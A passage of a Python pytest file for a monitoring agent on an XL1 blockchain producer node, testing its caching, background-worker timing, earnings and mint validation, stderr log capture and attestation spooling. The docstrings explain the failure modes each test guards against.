    seeing. It must not be confused with the reader having failed."""
    body = {"window": 1000, "totalBlocks": 1000,
            "producers": [{"address": "b" * 40, "blocks": 1000, "balance": 5.0}]}
    _stub_peers(monkeypatch, body)
    count, share, _ = agent.fetch_peers("xl1-producer")
    assert count == 1 and share == 0.0


def test_an_unreadable_answer_is_not_a_zero_share(monkeypatch):
    """The opposite trap: a failed lookup must never render as "produced
    nothing", which would send someone chasing a fault that is not there."""
    _stub_peers(monkeypatch, {"producers": None, "totalBlocks": 0})
    assert agent.fetch_peers("xl1-producer") == (None, None, None)


def test_peer_lookup_is_cached(monkeypatch):
    """One wide scan per interval, not one per heartbeat."""
    calls = []
    class _Resp:
        status = 200
        def read(self):
            calls.append(1)
            return json.dumps(PEERS_BODY).encode()
        def __enter__(self): return self
        def __exit__(self, *a): return False
    monkeypatch.setattr(agent.urllib.request, "urlopen", lambda url, timeout=0: _Resp())
    monkeypatch.setattr(agent, "REWARD_ADDRESS", "0xd1e2f3a4b5c6d7e8f9a0b1c2d3e4f5a6b7c8d9e0")
    monkeypatch.setitem(agent._peers_cache, "value", None)
    monkeypatch.setitem(agent._peers_cache, "at", 0.0)
    agent.fetch_peers("xl1-producer")
    agent.fetch_peers("xl1-producer")
    assert len(calls) == 1, f"expected one scan per interval, made {len(calls)}"


# --- slow work must not delay the beat ---------------------------------------
#
# The production scan allows 180 seconds and the peer scan 120, against a
# 90-second staleness threshold at the backend. Run inline, one slow scan could
# push the next heartbeat past the point where a node that is producing
# perfectly well is declared OFFLINE -- and alerted about. The agent could make
# its own node look dead by doing its job.


@pytest.fixture
def worker_on(monkeypatch):
    """Pretend the worker thread is running, without starting one."""
    monkeypatch.setitem(agent._slow, "on", True)
    monkeypatch.setitem(agent._slow, "data", {})
    monkeypatch.setitem(agent._slow, "degraded", set())
    return agent._slow


def test_the_beat_does_not_wait_for_a_slow_collector(worker_on, monkeypatch):
    """The whole point. With the worker running, a collector that takes longer
    than the staleness threshold must not be on the heartbeat's path at all."""
    def glacial(*a, **k):
        time.sleep(5)
        raise AssertionError("the beat called a slow collector directly")

    for slow in ("fetch_producer_stats", "fetch_peers", "fetch_standing",
                 "read_os_updates", "read_log_tail"):
        monkeypatch.setattr(agent, slow, glacial)
    monkeypatch.setattr(agent, "find_container", lambda: "xl1-producer")
    monkeypatch.setattr(agent, "fetch_block_heights", lambda: {"sequence": 1})

    started = time.monotonic()
    agent.collect()
    assert time.monotonic() - started < 1.0, "the beat waited on background work"


def test_without_a_worker_everything_runs_inline(monkeypatch):
    """The fallback that keeps this honest: with no worker, the collectors are
    called directly, so every other test exercises the real code path rather
    than a stub of it."""
    calls = []
    monkeypatch.setitem(agent._slow, "on", False)
    monkeypatch.setattr(agent, "find_container", lambda: None)
    monkeypatch.setattr(agent, "read_os_updates", lambda: calls.append("os") or (1, 0, 1.0, False))
    monkeypatch.setattr(agent, "fetch_block_heights", lambda: {"sequence": 1})
    agent.collect()
    assert calls == ["os"], "the collector should have been called inline"


def test_a_scan_is_reported_once_not_on_every_beat(worker_on, monkeypatch):
    """The production scan reports a RANGE the backend accumulates. Re-reading
    the worker's last result each beat would re-send an already-counted range
    thirty times a cycle, which the backend can only reject as a replay."""
    monkeypatch.setattr(agent, "find_container", lambda: "xl1-producer")
    monkeypatch.setattr(agent, "fetch_block_heights", lambda: {"sequence": 1})
    agent._slow_put("producer_stats", {"fromBlock": 100, "toBlock": 199, "produced": 3})

    first = agent.collect()
    second = agent.collect()
    assert first.get("scan_from_block") == 100, "the new scan should be reported"
    assert second.get("scan_from_block") is None, "and not reported again"


def test_a_last_known_value_is_reused_every_beat(worker_on, monkeypatch):
    """Everything that is not a range is a current reading, and should appear
    on every beat until the worker replaces it."""
    monkeypatch.setattr(agent, "find_container", lambda: "xl1-producer")
    monkeypatch.setattr(agent, "fetch_block_heights", lambda: {"sequence": 1})
    agent._slow_put("standing", (12.5, True, "XL1", "12500000000000000000", "0", "1"))

    for _ in range(3):
        assert agent.collect().get("producer_balance") == 12.5


def test_the_worker_survives_a_collector_that_raises(monkeypatch):
    """A dead worker is a silent one: every field it feeds would simply stop
    updating, with the panel showing stale values and saying nothing."""
    rounds = []

    def explode(*a, **k):
        rounds.append(1)
        raise RuntimeError("docker is having a day")

    monkeypatch.setattr(agent, "find_container", explode)
    monkeypatch.setattr(agent, "SLOW_CYCLE", 0)
    _break_loop_after_one_cycle(monkeypatch)

    with pytest.raises(_StopLoop):
        agent._slow_worker()
    assert rounds, "the cycle ran"


def test_a_clean_host_is_not_re_read_often(monkeypatch):
    """Nothing pending is the usual case and costs a subprocess to confirm.
    Six hours is right for it."""
    calls = []
    monkeypatch.setattr(agent, "run", lambda a, timeout=10: calls.append(1) or "Listing...")
    # Precise, not a blanket True: a stub that answers yes to everything also
    # answers yes to /var/run/reboot-required, which makes the "clean" host
    # pending and sends it down the fast path -- so the first version of this
    # test failed against correct code, for a reason of its own making.
    monkeypatch.setattr(agent.os.path, "exists", lambda p: "reboot-required" not in p)
    monkeypatch.setattr(agent.os.path, "getmtime", lambda p: agent.time.time() - 3600)
    monkeypatch.setitem(agent._os_cache, "value", None)
    monkeypatch.setitem(agent._os_cache, "at", 0.0)

    agent.read_os_updates()
    # Well past the pending interval, nowhere near the slow one.
    monkeypatch.setitem(agent._os_cache, "at", agent.time.monotonic() - 1800)
    agent.read_os_updates()
    assert len(calls) == 1, "a clean host should not be re-read every 15 minutes"


def test_a_pending_host_is_re_read_soon(monkeypatch):
    """The step this removes: at the slow cadence a host that had just been
    patched went on reporting the old count, and the all-clear email did not
    arrive, for up to six hours -- unless someone knew to restart the agent."""
    calls = []
    monkeypatch.setattr(agent, "run", lambda a, timeout=10: calls.append(1) or UPGRADABLE)
    monkeypatch.setattr(agent.os.path, "exists", lambda p: True)
    monkeypatch.setattr(agent.os.path, "getmtime", lambda p: agent.time.time() - 3600)
    monkeypatch.setitem(agent._os_cache, "value", None)
    monkeypatch.setitem(agent._os_cache, "at", 0.0)

    total, security, _age, _reboot = agent.read_os_updates()
    assert total and security, "fixture should leave something pending"
    monkeypatch.setitem(agent._os_cache, "at", agent.time.monotonic() - 1800)
    agent.read_os_updates()
    assert len(calls) == 2, "a host with updates waiting should be looked at again"


def test_a_pending_reboot_alone_keeps_the_fast_cadence(monkeypatch):
    """The count returns to zero the moment the packages install, but the
    machine is still running the old version until it restarts. Reading that
    as "clean" would drop back to six hours at precisely the point the
    operator is mid-task."""
    calls = []
    monkeypatch.setattr(agent, "run", lambda a, timeout=10: calls.append(1) or "Listing...")
    monkeypatch.setattr(agent.os.path, "exists", lambda p: True)
    monkeypatch.setattr(agent.os.path, "getmtime", lambda p: agent.time.time() - 3600)
    monkeypatch.setitem(agent._os_cache, "value", (0, 0, 1.0, True))   # reboot outstanding
    monkeypatch.setitem(agent._os_cache, "at", agent.time.monotonic() - 1800)

    agent.read_os_updates()
    assert len(calls) == 1, "a reboot still outstanding is still pending"


# Every collector the worker calls, stubbed. Leaving one out does not make the
# test more realistic, it makes it reach the real docker binary and the real
# network from a unit test -- which is how this test passed on Windows and
# failed on CI, where a live subprocess polls with time.sleep and swallowed the
# sentinel below.
_COLLECTORS = {
    "read_cli_version": lambda n: "5.3.0", "fetch_cli_latest": lambda: "5.3.0",
    "read_sdk_version": lambda: "3.1.0", "fetch_sdk_latest": lambda: "3.1.0",
    "flush_attestations": lambda: None,
    "read_log_tail": lambda n: ["line"], "read_image_inventory": lambda: 2,
    "read_blocked_reason": lambda n: None, "read_producer_unit": lambda: None,
    "read_rebuild_timer": lambda: (None, None), "read_repo_head": lambda: "a" * 40,
    "fetch_repo_upstream": lambda h: (None, None, None, None),
    "fetch_standing": lambda n: (1.0, True, "XL1", "1", None, None),
    "fetch_earnings": lambda n: (1.0, 1, 1.0, None, None),
    "fetch_peers": lambda n: (4, 14.6, 1000),
    "read_os_updates": lambda: (0, 0, 1.0, False),
    "fetch_producer_stats": lambda n: None,
    "fetch_minted_chunk": lambda n: None,
}


def _run_one_cycle(monkeypatch, **overrides):
    """One full pass of the slow worker. Returns what it published."""
    published = {}
    monkeypatch.setattr(agent, "_slow_put", lambda k, v: published.__setitem__(k, v))
    monkeypatch.setattr(agent, "find_container", lambda: "xl1-producer")
    for name, value in {**_COLLECTORS, **overrides}.items():
        monkeypatch.setattr(agent, name, value)
    _break_loop_after_one_cycle(monkeypatch)
    with pytest.raises(_StopLoop):
        agent._slow_worker()
    return published


def test_a_worker_cycle_runs_to_completion(monkeypatch):
    """Every collector reached, not just the first.

    The existing worker test makes find_container raise, so it never gets past
    the opening line -- which is how a _slow_put called with the wrong number of
    arguments sat there passing. The worker catches everything and keeps
    looping, so that failure would have been silent: the beat would carry no
    cli_version, no log tail, no scan, forever, with nothing logged after the
    first cycle.
    """
    published = _run_one_cycle(monkeypatch)
    for expected in ("cli_version", "cli_latest", "log_tail", "image_inventory",
                     "standing", "peers", "os_updates"):
        assert expected in published, f"{expected} was never published"


def test_one_broken_collector_does_not_starve_the_others(monkeypatch):
    """A collector that raises must cost its own reading and nothing else.

    The worker wrapped the whole cycle in one try, so the first collector to
    throw skipped every collector after it -- and kept skipping them on every
    cycle for as long as the cause lasted. The node would report ONLINE with a
    current heartbeat while its peer count, OS updates and block scans sat
    frozen at whatever they last held, which is precisely the silent staleness
    the rest of this agent is built to avoid.

    Found by CI, not by reading: standing published, peers did not.
    """
    def boom(_name):
        raise RuntimeError("the earnings service fell over")

    published = _run_one_cycle(monkeypatch, fetch_earnings=boom)

    assert "earnings" not in published, "a failed collector must publish nothing"
    for survivor in ("peers", "os_updates"):
        assert survivor in published, (
            f"{survivor} was skipped because an earlier collector failed")


def test_a_collector_failure_says_which_one_and_why(monkeypatch, capsys):
    """An empty stderr line is not a bug report.

    The cycle used to log str(e) alone. The exception that actually broke CI
    had an empty str(), so the log read "slow collector cycle failed: " and
    stopped -- naming neither the collector nor the type.
    """
    class Silent(Exception):
        pass

    def boom(_name):
        raise Silent()

    _run_one_cycle(monkeypatch, fetch_peers=boom)
    err = capsys.readouterr().err
    assert "peers" in err, "the log must name the collector that failed"
    assert "Silent" in err, "the log must name the exception type"


# --- earnings ---------------------------------------------------------------
#
# The balance answers "what does this account hold". These fields answer "what
# did producing pay", which is a different number the moment the operator has
# funded the node or moved anything out. The two are not interchangeable, so
# this reader has to be wrong in its own ways rather than the balance reader's.

EARNINGS_OK = {"earned": 37950.0, "blocksRewarded": 759, "rewardPerBlock": 50.0,
               "nonReward": 3.055006, "sdkAgrees": True}


def _serve(monkeypatch, *bodies):
    """Answer each call with the next body, the last one repeating.

    Returns the call log, so a test can assert on how many requests were made
    -- which is the only way to tell a cached answer from a repeated one.
    """
    calls = []

    class _Resp:
        status = 200
        def __init__(self, body): self._body = body
        def read(self): return json.dumps(self._body).encode()
        def __enter__(self): return self
        def __exit__(self, *a): return False

    def fake_urlopen(url, timeout=0):
        calls.append(url)
        return _Resp(bodies[min(len(calls) - 1, len(bodies) - 1)])

    monkeypatch.setattr(agent.urllib.request, "urlopen", fake_urlopen)
    monkeypatch.setattr(agent, "REWARD_ADDRESS", "0x" + "a" * 40)
    agent._earnings_cache["value"] = None
    agent._earnings_cache["at"] = 0.0
    return calls


def test_earnings_round_trip(monkeypatch):
    _serve(monkeypatch, EARNINGS_OK)
    assert agent.fetch_earnings("xl1-producer") == (37950.0, 759, 50.0, 3.055006, True)


def test_earnings_needs_a_reward_address(monkeypatch):
    """No address is not a failed read; there is nothing to read for."""
    _serve(monkeypatch, EARNINGS_OK)
    monkeypatch.setattr(agent, "REWARD_ADDRESS", "")
    monkeypatch.setattr(agent, "find_container", lambda: None)
    assert agent.fetch_earnings(None) is None


def test_a_200_carrying_nulls_is_not_an_answer(monkeypatch):
    """The service answers 200 with nulls when it cannot read the chain.

    Reporting that as earnings would show a node that earned nothing, which is
    a far more alarming claim than "this reader is degraded".
    """
    _serve(monkeypatch, {"earned": None, "rewardPerBlock": None})
    assert agent.fetch_earnings("xl1-producer") is None


def test_earnings_does_not_cache_a_failure(monkeypatch):
    """A cached failure outlives the outage that caused it."""
    calls = _serve(monkeypatch, {"earned": None}, EARNINGS_OK)
    assert agent.fetch_earnings("xl1-producer") is None
    assert agent.fetch_earnings("xl1-producer")[0] == 37950.0
    assert len(calls) == 2, "the failure must not have been cached"


def test_a_real_reading_is_cached(monkeypatch):
    """Two RPC calls per interval behind the service, not per heartbeat."""
    calls = _serve(monkeypatch, EARNINGS_OK)
    assert agent.fetch_earnings("xl1-producer")[0] == 37950.0
    assert agent.fetch_earnings("xl1-producer")[0] == 37950.0
    assert len(calls) == 1, "a real answer should be cached for the interval"


def test_sdk_disagreement_is_reported_not_suppressed(monkeypatch):
    """The chain is what was paid, so a schedule mismatch is not a read failure.

    It still has to reach the panel: the entire value of the cross-check is
    that somebody sees it when it trips.
    """
    body = dict(EARNINGS_OK)
    body["sdkAgrees"] = False
    _serve(monkeypatch, body)
    earned, _, _, _, sdk_ok = agent.fetch_earnings("xl1-producer")
    assert earned == 37950.0
    assert sdk_ok is False


def test_an_older_service_without_the_cross_check_still_reports(monkeypatch):
    """sdkAgrees arrived after earnings did. Its absence is not a failure."""
    body = {k: v for k, v in EARNINGS_OK.items() if k != "sdkAgrees"}
    _serve(monkeypatch, body)
    earned, _, _, _, sdk_ok = agent.fetch_earnings("xl1-producer")
    assert earned == 37950.0
    assert sdk_ok is None


def test_earnings_reaches_the_payload(monkeypatch):
    """The fields the panel reads, end to end through collect()."""
    monkeypatch.setattr(agent, "fetch_earnings",
                        lambda name: (37950.0, 759, 50.0, 3.055006, True))
    monkeypatch.setattr(agent, "find_container", lambda: "xl1-producer")
    payload = agent.collect()
    assert payload["producer_earned"] == 37950.0
    assert payload["producer_blocks_rewarded"] == 759
    assert payload["producer_reward_per_block"] == 50.0
    assert payload["producer_non_reward"] == 3.055006
    assert payload["producer_reward_sdk_ok"] is True


# --- per-day mints ----------------------------------------------------------
#
# This map is ACCUMULATED by the backend into a running per-day total, which
# makes it different from every other field the agent sends: nothing
# re-derives it afterwards, so a bad value is permanent. That is why the
# validator drops the whole map rather than the bad entry -- a partial day
# still looks like a real number, and a wrong number nobody can spot is worse
# than a missing one.


def test_minted_by_day_passes_a_good_map():
    out = agent.minted_by_day({"mintedByDay": {"2026-08-26": "7600000000000000000000",
                                               "2026-08-27": "8050000000000000000000"}})
    assert out == {"2026-08-26": "7600000000000000000000",
                   "2026-08-27": "8050000000000000000000"}


def test_absent_or_empty_is_not_an_error():
    """A range where this address earned nothing is a normal range."""
    assert agent.minted_by_day({}) is None
    assert agent.minted_by_day({"mintedByDay": {}}) is None
    assert agent.minted_by_day(None) is None


def test_a_bad_date_drops_the_whole_map():
    bad = {"2026-08-26": "7600000000000000000000", "not-a-date": "1"}
    assert agent.minted_by_day({"mintedByDay": bad}) is None


def test_a_bad_amount_drops_the_whole_map():
    for amount in ["-5", "1.5", "abc", 12, None, "9" * 41]:
        bad = {"2026-08-26": "7600000000000000000000", "2026-08-27": amount}
        assert agent.minted_by_day({"mintedByDay": bad}) is None, amount


def test_an_implausibly_long_map_is_refused():
    """A 50000-block chunk spans about 35 days. 400 is a bug, not a big chunk."""
    huge = {"2026-%02d-%02d" % (m, d): "1"
            for m in range(1, 13) for d in range(1, 29)}
    huge.update({"2025-%02d-%02d" % (m, d): "1"
                 for m in range(1, 13) for d in range(1, 29)})
    assert len(huge) > 400
    assert agent.minted_by_day({"mintedByDay": huge}) is None


def test_the_scan_and_the_mint_walk_both_carry_it(monkeypatch):
    """Forward for today, the mint walk for everything before it.

    Two separate paths on purpose: the block backfill finishes once and never
    runs again, so a node that completed it before mints existed would never be
    asked for a single chunk of history.
    """
    monkeypatch.setattr(agent, "find_container", lambda: "xl1-producer")
    monkeypatch.setattr(agent, "fetch_producer_stats", lambda name: {
        "fromBlock": 572000, "toBlock": 572100, "produced": 15,
        "mintedByDay": {"2026-08-27": "750000000000000000000"},
    })
    monkeypatch.setattr(agent, "fetch_minted_chunk", lambda name: {
        "fromBlock": 520000, "toBlock": 569999, "produced": 800,
        "mintedByDay": {"2026-07-20": "40000000000000000000000"},
    })
    payload = agent.collect()
    assert payload["scan_minted_by_day"] == {"2026-08-27": "750000000000000000000"}
    assert payload["minted_by_day"] == {"2026-07-20": "40000000000000000000000"}
    assert payload["minted_from_block"] == 520000
    assert payload["minted_to_block"] == 569999


def test_a_quiet_range_still_moves_the_cursor(monkeypatch):
    """A stretch where this address earned nothing must still be reported.

    Otherwise the cursor never passes it and the walk stalls forever on the
    first quiet period -- which for a young node is most of the chain.
    """
    monkeypatch.setattr(agent, "find_container", lambda: "xl1-producer")
    monkeypatch.setattr(agent, "fetch_producer_stats", lambda name: {
        "fromBlock": 572000, "toBlock": 572100, "produced": 0,
    })
    monkeypatch.setattr(agent, "fetch_minted_chunk", lambda name: {
        "fromBlock": 100000, "toBlock": 149999, "produced": 0, "mintedByDay": {},
    })
    payload = agent.collect()
    assert payload["minted_from_block"] == 100000
    assert payload["minted_to_block"] == 149999
    assert "minted_by_day" not in payload, "nothing earned, nothing to add"


def test_the_mint_walk_does_not_wait_for_a_production_scan(monkeypatch):
    """It has its own cursor, and waiting capped it at one chunk per cycle.

    The producer scan runs every fifteen minutes. Riding on it meant the whole
    history could advance four times an hour at best -- and while it sat behind
    a range too large to fetch, not at all.
    """
    monkeypatch.setattr(agent, "find_container", lambda: "xl1-producer")
    monkeypatch.setattr(agent, "fetch_producer_stats", lambda name: None)
    monkeypatch.setattr(agent, "fetch_minted_chunk", lambda name: {
        "fromBlock": 100000, "toBlock": 104999, "produced": 3,
        "mintedByDay": {"2026-07-04": "150000000000000000000"},
    })
    payload = agent.collect()
    assert payload["minted_from_block"] == 100000, "no scan ran; the walk still moved"
    assert payload["minted_to_block"] == 104999
    assert payload["minted_by_day"] == {"2026-07-04": "150000000000000000000"}


def test_the_mint_walk_asks_for_a_smaller_range_than_the_block_backfill():
    """Reading every payload costs far more than testing one field.

    The larger range did not return inside the timeout, and a timed-out request
    is indistinguishable from a walk that has finished: the cursor simply never
    moves again.
    """
    assert agent.MINTED_CHUNK < agent.BACKFILL_CHUNK


def test_the_mint_request_gets_longer_than_the_default_timeout(monkeypatch):
    """Sized for the work, not for the forward scan of a dozen blocks."""
    seen = {}

    def fake_request(address, params, timeout=180):
        seen["timeout"] = timeout
        seen["span"] = params["to"] - params["from"] + 1
        return None

    monkeypatch.setattr(agent, "_producer_request", fake_request)
    monkeypatch.setattr(agent, "read_reward_address", lambda name: "a6" + "0" * 38)
    monkeypatch.setitem(agent._producer_cursor, "minted", 500000)
    monkeypatch.setitem(agent._producer_cursor, "minted_done", False)
    agent.fetch_minted_chunk("xl1-producer")
    assert seen["timeout"] > 180, "the default is sized for a dozen blocks"
    assert seen["span"] == agent.MINTED_CHUNK


def test_the_protocol_s_own_ineligibility_words_are_recognised(monkeypatch):
    """producerIneligibility returns four reasons; the node logs what it is told.

    Watching for them before staking is enforced is the whole point: the day it
    is switched on, a node that stops producing should say why on the panel
    rather than going quiet while every other tile stays green.
    """
    for line, expected in [
        ("producer refused: no-intent", "no stake intent declared"),
        ("producer refused: unseasoned-or-understaked", "stake too new or too small"),
        ("producer refused: unseasoned", "stake not yet seasoned"),
        ("producer refused: insufficient-self-bond", "self-bond below the minimum"),
        ("Producer has insufficient stake for block", "insufficient stake"),
        ("Producer abc has no balance.", "no balance"),
    ]:
        monkeypatch.setattr(agent, "run", lambda *a, **k: line)
        assert agent.read_blocked_reason("xl1-producer") == expected, line


def test_the_more_specific_reason_wins(monkeypatch):
    """"unseasoned-or-understaked" contains "unseasoned".

    Ordering decides which is reported, and the vaguer one would send an
    operator looking at the wrong thing -- waiting for stake to age when it is
    also too small.
    """
    monkeypatch.setattr(agent, "run", lambda *a, **k: "refused: unseasoned-or-understaked")
    assert agent.read_blocked_reason("xl1-producer") == "stake too new or too small"


# --- stderr is half the log ---------------------------------------------------
#
# A container's stderr arrives on the COMMAND's stderr, so reading stdout alone
# drops every warning the node emits. That is not hypothetical: a producer sat
# printing "insufficient stake" every few seconds while the panel showed only
# "Building block" and the eligibility check reported nothing wrong.
#
# The first test here runs a real subprocess on purpose. A stubbed `run` cannot
# fail this way, which is precisely why stubs did not catch it.

def test_run_captures_stderr_when_asked():
    """The mechanism itself, with no mocking in the way."""
    script = "import sys; sys.stderr.write('on-stderr'); sys.stdout.write('on-stdout')"
    out = agent.run([sys.executable, "-c", script], merge_stderr=True)
    assert "on-stderr" in out
    assert "on-stdout" in out


def test_run_discards_stderr_by_default():
    """Off by default and deliberately so: apt writes its "unstable CLI"
    warning to stderr, and folding that into parsed output corrupts it."""
    script = "import sys; sys.stderr.write('noise'); sys.stdout.write('signal')"
    out = agent.run([sys.executable, "-c", script])
    assert out == "signal"


def test_the_eligibility_check_reads_both_streams(monkeypatch):
    """The node announces ineligibility on stderr, so asking for stdout alone
    finds a healthy-looking log and reports no fault."""
    seen = {}

    def fake_run(args, timeout=10, merge_stderr=False):
        seen["merge"] = merge_stderr
        return "Producer abc has insufficient stake." if merge_stderr else "Building block 1"

    monkeypatch.setattr(agent, "run", fake_run)
    assert agent.read_blocked_reason("xl1-producer") == "insufficient stake"
    assert seen["merge"] is True


def test_the_log_tail_reads_both_streams(monkeypatch):
    """A tail that shows only stdout is not a tail. The lines an operator most
    needs are the ones written to the other stream."""
    seen = {}

    def fake_run(args, timeout=10, merge_stderr=False):
        seen["merge"] = merge_stderr
        return "Building block 1\nhas insufficient stake." if merge_stderr else "Building block 1"

    monkeypatch.setattr(agent, "run", fake_run)
    tail = agent.read_log_tail("xl1-producer")
    assert seen["merge"] is True
    assert any("insufficient stake" in ln for ln in tail), tail


def _stub_urlopen(monkeypatch, by_url):
    """Answer specific URLs with JSON, and refuse anything else.

    Refusing the unexpected matters: a stub that answers every URL would let a
    test pass while the code fetched something entirely different.
    """
    import json as _json

    class _Resp:
        def __init__(self, payload):
            self.status = 200
            self._payload = payload
        def read(self):
            return _json.dumps(self._payload).encode()
        def __enter__(self):
            return self
        def __exit__(self, *a):
            return False

    def fake_urlopen(url, timeout=0):
        target = url if isinstance(url, str) else getattr(url, "full_url", "")
        if target not in by_url:
            raise AssertionError("unexpected fetch: %s" % target)
        return _Resp(by_url[target])

    monkeypatch.setattr(agent.urllib.request, "urlopen", fake_urlopen)



# --- SDK version of the companion service -------------------------------------
#
# The node container's CLI version was already reported. This is the SDK the
# service reads the chain WITH, which is the more consequential of the two: it
# decodes blocks and mint transfers, so a library too old for a protocol change
# returns a plausible wrong number rather than an error.

def test_sdk_version_comes_from_the_service(monkeypatch):
    agent._sdk_cache.update({"installed": None, "installed_at": 0.0})
    _stub_urlopen(monkeypatch, {
        agent.VERSIONS_URL: {"packages": {"@xyo-network/xl1-sdk": "5.3.3"}, "node": "24.17.0"},
    })
    assert agent.read_sdk_version() == "5.3.3"


def test_a_service_that_is_down_costs_nothing(monkeypatch):
    """Reported by other fields already; it must not also break the beat."""
    agent._sdk_cache.update({"installed": None, "installed_at": 0.0})
    def boom(*_a, **_k):
        raise OSError("connection refused")
    monkeypatch.setattr(agent.urllib.request, "urlopen", boom)
    assert agent.read_sdk_version() is None


def test_a_missing_sdk_entry_is_not_a_version(monkeypatch):
    """The service answered, but not about the package we asked for."""
    agent._sdk_cache.update({"installed": None, "installed_at": 0.0})
    _stub_urlopen(monkeypatch, {
        agent.VERSIONS_URL: {"packages": {"@xyo-network/payload-model": "5.3.30"}},
    })
    assert agent.read_sdk_version() is None


def test_sdk_latest_comes_from_the_registry(monkeypatch):
    agent._sdk_cache.update({"latest": None, "latest_at": 0.0})
    _stub_urlopen(monkeypatch, {agent.SDK_REGISTRY: {"version": "5.4.1"}})
    assert agent.fetch_sdk_latest() == "5.4.1"


def test_the_sdk_check_can_be_switched_off(monkeypatch):
    """Both halves: a local version with nothing to compare it to is not useful."""
    monkeypatch.setattr(agent, "VERSIONS_URL", "")
    monkeypatch.setattr(agent, "SDK_REGISTRY", "")
    assert agent.read_sdk_version() is None
    assert agent.fetch_sdk_latest() is None


# --- attestation --------------------------------------------------------------
#
# The ordering these cover is the whole point: the chain stores a hash and will
# not serve the payload back, so between anchoring and the backend knowing, the
# spool file is the only copy of what that transaction committed to.

def test_attestation_is_off_unless_configured(monkeypatch):
    """Deploying the agent must not start spending gas by itself."""
    monkeypatch.setattr(agent, "ATTEST_URL", "")
    called = []
    monkeypatch.setattr(agent.urllib.request, "urlopen",
                        lambda *a, **k: called.append(1))
    agent.attest("xl1-producer", {})
    assert called == []


def test_an_anchored_attestation_is_spooled_before_it_is_sent(tmp_path, monkeypatch):
    order = []

    monkeypatch.setattr(agent, "ATTEST_URL", "http://svc/attest")
    monkeypatch.setattr(agent, "ATTEST_SPOOL", str(tmp_path))
    monkeypatch.setattr(agent, "read_reward_address", lambda name: "a6" * 20)
    agent._attest_cache["at"] = None

    _stub_urlopen(monkeypatch, {"http://svc/attest": {
        "anchored": True, "network": "sequence",
        "contentHash": "c" * 64, "txHash": "d" * 64,
        "attestedBy": "e" * 40,
        "payload": {"schema": "network.xyo.id", "salt": "{}"},
        "record": {"observedAt": "2026-08-29T00:00:00.000Z"},
    }})

    real_spool = agent.spool_attestation
    def spy_spool(record):
        order.append("spool")
        return real_spool(record)
    monkeypatch.setattr(agent, "spool_attestation", spy_spool)
    monkeypatch.setattr(agent, "post_attestation",
                        lambda record: order.append("post") or True)

    agent.attest("xl1-producer", {})
    assert order == ["spool", "post"], order


def test_a_backend_that_is_down_leaves_the_payload_on_disk(tmp_path, monkeypatch):
    """The failure this exists for. Losing the payload leaves a transaction
    proving a hash was anchored and nothing able to say what it was a hash of."""
    monkeypatch.setattr(agent, "ATTEST_URL", "http://svc/attest")
    monkeypatch.setattr(agent, "ATTEST_SPOOL", str(tmp_path))
    monkeypatch.setattr(agent, "read_reward_address", lambda name: "a6" * 20)
    agent._attest_cache["at"] = None
    _stub_urlopen(monkeypatch, {"http://svc/attest": {
        "anchored": True, "network": "sequence",
        "contentHash": "f" * 64, "txHash": "0" * 64,
        "payload": {"schema": "network.xyo.id", "salt": "{}"},
    }})
    monkeypatch.setattr(agent, "post_attestation", lambda record: False)

    agent.attest("xl1-producer", {})
    kept = list(tmp_path.glob("*.json"))
    assert len(kept) == 1, kept
    assert json.loads(kept[0].read_text())["content_hash"] == "f" * 64


def test_a_spooled_attestation_is_retried_and_then_removed(tmp_path, monkeypatch):
    monkeypatch.setattr(agent, "ATTEST_SPOOL", str(tmp_path))
    (tmp_path / "abc.json").write_text(json.dumps({"content_hash": "a" * 64}))
    monkeypatch.setattr(agent, "post_attestation", lambda record: True)
    agent.flush_attestations()
    assert list(tmp_path.glob("*.json")) == []


def test_a_failed_retry_keeps_the_file_for_next_time(tmp_path, monkeypatch):
    monkeypatch.setattr(agent, "ATTEST_SPOOL", str(tmp_path))
    (tmp_path / "abc.json").write_text(json.dumps({"content_hash": "a" * 64}))
    monkeypatch.setattr(agent, "post_attestation", lambda record: False)
    agent.flush_attestations()
    assert len(list(tmp_path.glob("*.json"))) == 1


def test_a_service_with_no_key_anchors_nothing_and_stores_nothing(tmp_path, monkeypatch):
    """anchored: false is the normal answer before a key is configured, not an
    error -- and nothing should be recorded for an anchoring that did not happen."""
    monkeypatch.setattr(agent, "ATTEST_URL", "http://svc/attest")
    monkeypatch.setattr(agent, "ATTEST_SPOOL", str(tmp_path))
    monkeypatch.setattr(agent, "read_reward_address", lambda name: "a6" * 20)
    agent._attest_cache["at"] = None
    _stub_urlopen(monkeypatch, {"http://svc/attest": {
        "anchored": False, "reason": "no signing key configured",
        "contentHash": "a" * 64,
        "payload": {"schema": "network.xyo.id", "salt": "{}"},
    }})
    agent.attest("xl1-producer", {})
    assert list(tmp_path.glob("*.json")) == []


def test_attest_sends_the_anchor_token(monkeypatch):
    """The service refuses an unauthenticated caller, correctly. An agent that
    does not present the token gets a 401 and, before this, said nothing."""
    seen = {}

    class _Resp:
        status = 200
        def read(self):
            return json.dumps({"anchored": False}).encode()
        def __enter__(self): return self
        def __exit__(self, *a): return False

    def fake_urlopen(req, timeout=0):
        seen["headers"] = dict(getattr(req, "headers", {}))
        return _Resp()

    monkeypatch.setattr(agent, "ATTEST_URL", "http://svc/attest")
    monkeypatch.setattr(agent, "ATTEST_TOKEN", "s3cret")
    monkeypatch.setattr(agent, "read_reward_address", lambda name: "a6" * 20)
    monkeypatch.setattr(agent.urllib.request, "urlopen", fake_urlopen)
    agent._attest_cache["at"] = None

    agent.attest("xl1-producer", {})
    # urllib title-cases header names.
    assert seen["headers"].get("X-anchor-token") == "s3cret", seen["headers"]


def test_a_refused_attest_is_reported_not_swallowed(monkeypatch, capsys):
    """A 401 looked exactly like attestation being switched off, which is how a
    misconfigured agent went an hour looking perfectly healthy."""
    def raise_401(req, timeout=0):
        raise agent.urllib.error.HTTPError("http://svc/attest", 401, "Unauthorized", {}, None)

    monkeypatch.setattr(agent, "ATTEST_URL", "http://svc/attest")
    monkeypatch.setattr(agent, "read_reward_address", lambda name: "a6" * 20)
    monkeypatch.setattr(agent.urllib.request, "urlopen", raise_401)
    agent._attest_cache["at"] = None
    agent._warned.clear()

    agent.attest("xl1-producer", {})
    err = capsys.readouterr().err
    assert "401" in err, err
    assert "XL1_ANCHOR_TOKEN" in err, err


def test_chain_values_survive_a_beat_that_carried_no_scan(monkeypatch):
    """A producer scan runs about once in thirty beats, so the beat that
    triggers an anchor usually carries none. The first anchored reading
    reported no last produced block for exactly this reason."""
    sent = {}

    class _Resp:
        status = 200
        def read(self): return json.dumps({"anchored": False}).encode()
        def __enter__(self): return self
        def __exit__(self, *a): return False

    def fake_urlopen(req, timeout=0):
        sent.update(json.loads(req.data.decode()))
        return _Resp()

